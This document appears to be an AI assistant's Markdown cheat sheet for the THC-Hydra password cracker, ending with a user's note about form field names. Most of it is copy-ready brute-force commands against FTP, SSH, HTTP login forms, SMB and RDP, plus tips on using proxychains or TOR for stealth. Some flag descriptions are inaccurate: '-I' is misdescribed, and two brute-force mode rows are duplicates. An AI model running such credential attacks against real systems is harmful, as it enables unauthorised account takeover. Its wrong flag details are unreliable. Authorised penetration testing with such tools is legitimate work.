Here's an **updated Hydra (THC-Hydra) cheat sheet** formatted for quick reference with **commands**, **common services**, **flags**, and **example usages** in structured **tables** and notes. This includes recent updates and best practices as of 2025.

---

## 🔐 **Hydra (THC-Hydra) Cheat Sheet** — _Fast and Flexible Network Login Cracker_

---

### ✅ **Basic Syntax**

```bash
hydra [OPTIONS] -L USERLIST -P PASSLIST [PROTOCOL]://TARGET
```

Or:

```bash
hydra [OPTIONS] -l USER -p PASS [PROTOCOL]://TARGET
```

---

### 📋 **Common Options**

|Option|Description|
|---|---|
|`-l`|Single username|
|`-L`|Username list file|
|`-p`|Single password|
|`-P`|Password list file|
|`-s PORT`|Custom port|
|`-t TASKS`|Number of parallel tasks (default: 16)|
|`-V`|Verbose output (shows each login attempt)|
|`-vV`|Super verbose (all output + attempt detail)|
|`-f`|Exit when a valid login is found|
|`-o FILE`|Output file|
|`-I`|Ignore "invalid" responses for some protocols|
|`-w TIME`|Wait timeout for response in seconds|
|`-e nsr`|Try `n` (null), `s` (same as username), `r` (reverse username)|
|`-R`|Restore from a saved session (`hydra.restore`)|

---

### 🔁 **Brute-Force Modes**

|Mode|Usage|
|---|---|
|Single user, wordlist|`-l user -P passlist.txt`|
|Wordlist of users and passwords|`-L users.txt -P passlist.txt`|
|All combinations|`-L users.txt -P passlist.txt`|
|Username = Password|`-L users.txt -e s`|

---

### 💻 **Supported Protocols (Popular Ones)**

| Protocol       | Syntax Example                               | Notes                         |
| -------------- | -------------------------------------------- | ----------------------------- |
| ftp            | `ftp://target`                               | Standard FTP brute force      |
| ssh            | `ssh://target`                               | Use `-t 4` for better control |
| telnet         | `telnet://target`                            | Often has banners             |
| http-get       | `http-get://target`                          | Simple GET login forms        |
| http-post-form | `http-post-form://host/path:params:fail_str` | Highly customizable           |
| rdp            | `rdp://target`                               | Uses FreeRDP                  |
| smb            | `smb://target`                               | Windows shares/login          |
| smtp           | `smtp://target`                              | Mail brute force              |
| vnc            | `vnc://target`                               | VNC brute force               |
| mysql          | `mysql://target`                             | MySQL brute force             |
| postgres       | `postgres://target`                          | PostgreSQL brute force        |

---

### 🛠️ **Examples**

#### FTP:

```bash
hydra -L users.txt -P pass.txt ftp://192.168.1.10
```

#### SSH (4 threads):

```bash
hydra -L users.txt -P pass.txt -t 4 ssh://192.168.1.10
```

#### HTTP POST Form:

```bash
hydra -l admin -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
```

#### SMB (Windows):

```bash
hydra -L users.txt -P pass.txt smb://192.168.1.10
```

#### RDP:

```bash
hydra -L users.txt -P pass.txt rdp://192.168.1.10
```

---

### 🧠 **Tips & Best Practices**

|Tip|Description|
|---|---|
|Use `-t 4` to avoid service lockout|Especially for SSH and SMB|
|Use `-f` to stop on first success|Saves time|
|Use `-V` or `-vV` to debug issues|Helps track what's failing|
|Try `-e nsr` to extend attack vectors|Null, Same-as-username, Reverse-username|
|Pair with **proxychains** or VPN|For stealth in engagements|
|Use **custom http-post-form** logic|Tailor to app-specific login formats|
|Use **`hydra -U`** to show supported modules|Useful to discover new targets|

---

### 💡 **Special Modules (as of 2025)**

|Module|Use Case|
|---|---|
|`http-head`|For checking headers-based auth|
|`imap`|Mail brute-force|
|`snmp`|Community string brute-force|
|`ldap2`|Lightweight Directory Access|
|`teamspeak`|Teamspeak 3 server login|
|`asterisk`|VoIP-based password brute-force|

---

### 🔐 **Output Handling**

|Option|Action|
|---|---|
|`-o FILE`|Save results to a file|
|`-R`|Resume session from `hydra.restore`|
|`-I`|Ignore errors that stop some modules|

---

### 🚀 **Combine with Other Tools**

|Tool|Purpose|
|---|---|
|`nmap`|Identify open ports and services|
|`cewl`|Custom wordlist generation|
|`burpsuite`|Analyze HTTP login forms for post-form|
|`crunch`|Generate wordlists|
|`medusa`|Alternative to Hydra with similar usage|
|`proxychains`|Add anonymity via proxy or TOR|

---

Would you like this in **PDF format** or added as a **markdown file** to share or keep offline?



NOTE!!!!!!!!!!! 
in lines like this -> "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

user and pass must match html file or they will never work 
most html files use username and password instead of user and pass 